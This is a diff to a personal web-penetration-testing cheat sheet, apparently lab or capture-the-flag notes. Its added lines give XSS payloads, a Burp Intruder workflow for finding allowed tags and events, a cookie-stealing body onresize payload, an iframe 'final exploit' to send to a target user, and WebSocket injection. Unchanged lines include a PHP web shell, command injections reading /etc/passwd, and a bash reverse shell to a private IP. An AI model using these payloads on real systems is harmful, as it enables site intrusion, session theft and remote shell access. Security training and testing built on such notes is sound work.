@@ -252,10 +252,12 @@ Input fields - Interpreted or Scrubbed?
 aaaaaaaaaaaaaaaaa... 
 hello " ; < >
  < > ' " { } ;  
+<img>
 <script>alert(1);</script>
 <ScRiPt>alert(1);</ScRiPt>
 "><script>alert(1)</script>
 <img src="x" onerror="alert(1);">
+<img src=x onerror=alert()>
 <svg/onload = alert(1);>
 <?php echo('Hello World'); ?>
 <?php system($_GET["cmd"]); ?>
@@ -264,6 +266,28 @@ hello " ; < >
    return 2+2;
 })();
 
+=================================== 
+Brute for XSS (Tags & Events)
+
+'Search Field' for XSS
+<img>   .."tag is not allowed"
+<img src=1 onerror=print()>
+GET /?search=%3C§img§%3E HTTP/2
+Burp > Intruder > Attack for tags that work
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+<body onerror=>      ..Error "Attribute is not allowed"
+<body §onerror§=>    ..Attack the Events from Portswigger
+%3Cbody+§onerror§%3D%3E  ..url encoded
+<body onresize=>         .."onresize" was allowed!
+<body onresize=alert(document.cookie)>
+Final exploit.. Send a link/email to target/user
+<iframe src="https://server/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+
+=================================== 
+Burp Scan
+
+Will find DOM XSS and give a POC
+Will locate a SQLi and then you feed it to SQLMap
 
 =================================== 
 Login Bypass
@@ -486,7 +510,6 @@ cmd=ls -la & cat /etc/passwd&job=Run      ..Combo
 cmd=-o /path/test.html http://IP/test.html&Submit=Go ..switch(works w/curl) 
 cmd=ls&&bash -c 'bash -i >& /dev/tcp/192.168.162.46/443 0>&1' 
 
-
 Commands Blocked - Try $()
 http://192.168.200.5/?ip=`uname`                    ..error 
 http://192.168.200.5/?ip=$(uname)                   ..ok, but blind 
@@ -524,6 +547,14 @@ Other
 
 Upload-Pages are full of holes
 Burp to find secret pages 
+
+=================================== 
+Web-Sockets
+
+Burp can capture these. Watch for "Chat" activity.
+{"message":""}
+{"user":"You","Content:"&lt;"}             ..intercept
+{"message":"<img src=x onerror=alert()>"}  ..inject xss
 
 =================================== 
 Rabbits
